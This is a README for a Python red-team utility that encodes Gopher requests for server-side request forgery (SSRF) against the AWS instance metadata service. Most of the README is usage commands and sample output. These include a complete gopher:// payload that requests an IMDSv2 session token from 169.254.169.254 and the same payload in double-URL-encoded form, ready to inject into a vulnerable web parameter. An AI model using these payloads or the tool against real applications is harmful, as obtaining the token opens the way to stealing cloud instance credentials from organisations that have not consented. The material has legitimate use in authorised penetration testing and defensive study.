# Gopher Encoder
Encode raw Gopher requests into AWS IMDSv2-safe URL format for use in SSRF exploitation and red team scenarios.

Part of the [aws-red-team-tools](https://github.com/CyberWolfByte/aws-red-team-tools) collection, this utility helps automate the encoding of Gopher-style HTTP requests used to access the AWS Instance Metadata Service (IMDSv2) via vulnerable web applications or proxies.

## Features
- Double URL-encoding of the HTTP payload
- Correct encoding of Gopher scheme and request path
- CRLF (`\r\n`) line endings are double-encoded as `%250D%250A`
- Automatically handles any number of HTTP headers
- Supports malformed headers (missing colon) with fallback line encoding
- Output can be saved to a file


## Input Options
- `--file` or `-f`: Load raw Gopher request from a file
- `--stdin` or `-s`: Paste raw Gopher request directly into the terminal
- `raw`: Provide a multi-line Gopher request as a string argument


## Prerequisites
- **Python**: 3.6+

## Usage
Clone the repo:
```bash
git clone https://github.com/CyberWolfByte/aws-red-team-tools.git
cd aws-red-team-tools/gopher-encoder
```

Encode from file:
```bash
python3 gopher_encoder.py --file gopher_request.txt
```

Encode from terminal:
```bash
python3 gopher_encoder.py --stdin
# Paste your request, then press Ctrl+D (Linux/macOS) or Ctrl+Z, then Enter (Windows)
```

Encode directly from a string:
```bash
python3 gopher_encoder.py "gopher://169.254.169.254:80/_PUT /latest/api/token HTTP/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600"
```

Save encoded output to file:
```bash
python3 gopher_encoder.py -f gopher_request.txt -o encoded_output.txt

python3 gopher_encoder.py --stdin -o encoded_output.txt

python3 gopher_encoder.py "gopher://..." --output encoded_output.txt
```

## How It Works
- Input must start with gopher:// — this is enforced
- The first line must contain the `/_` prefix to indicate a raw HTTP payload
- All HTTP data after `/_` is double URL-encoded
- All line endings (`\r\n`) are double-encoded to `%250D%250A`
- Headers are encoded as `Key%3A%2520Value%250D%250A`

## Output Examples
```
python3 gopher_encoder.py --stdin -o encoded_output.txt
Paste the raw Gopher request (end with Ctrl+D):
gopher://169.254.169.254:80/_PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
[+] Encoded Gopher request written to: encoded_output.txt

cat encoded_output.txt
gopher%3A%2F%2F169.254.169.254%3A80%2F_PUT%2520%252Flatest%252Fapi%252Ftoken%2520HTTP%252F1.1%250D%250AHost%3A%2520169.254.169.254%250D%250AX-aws-ec2-metadata-token-ttl-seconds%3A%252021600%250D%250A
```
```
python3 gopher_encoder.py -s                                         
Paste the raw Gopher request (end with Ctrl+D):
gopher://169.254.169.254:80/_PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
gopher%3A%2F%2F169.254.169.254%3A80%2F_PUT%2520%252Flatest%252Fapi%252Ftoken%2520HTTP%252F1.1%250D%250AHost%3A%2520169.254.169.254%250D%250AX-aws-ec2-metadata-token-ttl-seconds%3A%252021600%250D%250A

```
## Contributing
If you have an idea for improvement or wish to collaborate, feel free to contribute.
